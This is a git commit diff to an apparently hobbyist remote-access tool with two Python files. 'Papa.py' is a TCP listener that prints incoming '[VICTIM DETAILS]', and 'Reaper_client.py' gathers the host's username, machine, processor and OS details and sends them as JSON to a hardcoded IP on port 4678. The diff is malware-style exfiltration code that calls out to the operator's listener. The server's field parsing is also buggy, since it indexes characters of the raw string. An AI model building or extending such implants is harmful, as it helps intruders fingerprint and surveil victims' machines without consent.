2ed8a5370ad44759cccac8064e597b80c7a82466
snak-linux <nirvan.work@gmail.com>
2023-03-16 01:49:35 +0530

    Made changes that allowed client to send victim details to Papa

--- Papa.py
+++ Papa.py
@@ -1,24 +1,53 @@
 import socket
+import json
 
-SERVER_IP = "192.168.1.176"
+# Linux IP: 192.168.1.157
+SERVER_IP = input("Enter the IP address: ")
 PORT = 4678
 
-# Create the socket using "with" to automatically close the socket
-with (socket.socket(socket.AF_INET, socket.SOCK_STREAM)) as sock:
-    print("Listening...")
-    # Bind the IP address to the port
-    sock.bind((SERVER_IP, PORT))
-    sock.listen(1)
-    
-    # When a connection is accepted, an instance representing
-    # the client and server's connection and the address of the client
-    connection, client_ip = sock.accept()
+try:
+    # Create the socket using "with" to automatically close the socket
+    with (socket.socket(socket.AF_INET, socket.SOCK_STREAM)) as sock:
+        print("Listening for incoming connections...")
 
-    with (connection):
-        print(f"Connection was established with: {client_ip}")
-        while True:
-            # Data can only be sent as binary. Prefix it with 'b'
-            connection.send(b"Hehehe...")
-            break
-
+        #  Bind the IP address to the port
+        sock.bind((SERVER_IP, PORT))
         
+        # Only listen for 1 connect request. When a request is received, 
+        # reject any further requests to connect
+        sock.listen(1)
+        
+        # When a connection is accepted, an instance representing
+        # the client and server's connection and the address of the client
+        # Use this connection instance to communciate with the connected client
+        connection, address = sock.accept()
+        received_victim_details = False
+        count = 0
+
+        with (connection):
+            print(f"Connection was established with: {address}")
+
+            while True:
+                # Data can only be sent as binary. Prefix it with 'b'
+                # connection.send(b"Hehehe...")
+                data = connection.recv(1024).decode("ascii")
+
+                if not data:
+                    break
+                
+                # Display details of the victim first
+                if count == 0:
+                    print("[VICTIM DETAILS]\n")
+                    print(f"Username: {data[0]}")
+                    print(f"System: {data[4]}")
+                    print(f"Machine: {data[1]}")
+                    print(f"Processor: {data[2]}")
+                    print(f"Processor count: {data[3]}")
+                
+                else:
+                    print(f"Received: {json.loads(data)}")
+                    
+                count += 1
+
+except OSError as e:
+    print(f"Failed to assign IP address: {e.strerror}")
--- Reaper_client.py
+++ Reaper_client.py
@@ -1,18 +1,39 @@
 import socket
 from Reaper import Reaper
+from Victim import Victim
+import json
 
-SERVER_IP = "192.168.1.176"
+SERVER_IP = "192.168.1.157"
 SERVER_PORT = 4678
 
+
+
 class Reaper_client(Reaper):
+
+    def __init__(self):
+        self.victim = Victim()
+
+
+    def get_serialized_victim_details(self):
+        # Serialize the list containing the victim's details
+        # using json and send it
+
+        data = [self.victim.username, self.victim.machine, self.victim.processor, 
+                self.victim.processor_count, self.victim.system]
+
+        return json.dumps(data)
 
     def connect(self):
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
             sock.connect((SERVER_IP, SERVER_PORT))
-            data = sock.recv(1024)
-            print(f"Received: {data}")
+            # sock.send(self.victim.username.encode())
+            # sock.send(self.victim.system.encode())
+            # sock.send(self.victim.machine.encode())
+            # sock.send(self.victim.processor.encode())
+            # sock.send(self.victim.processor_count.encode())               
+            sock.send(self.get_serialized_victim_details().encode())
 
-        input("Press any key to exit...")
+        input("Press enter to exit...")
 
 
 
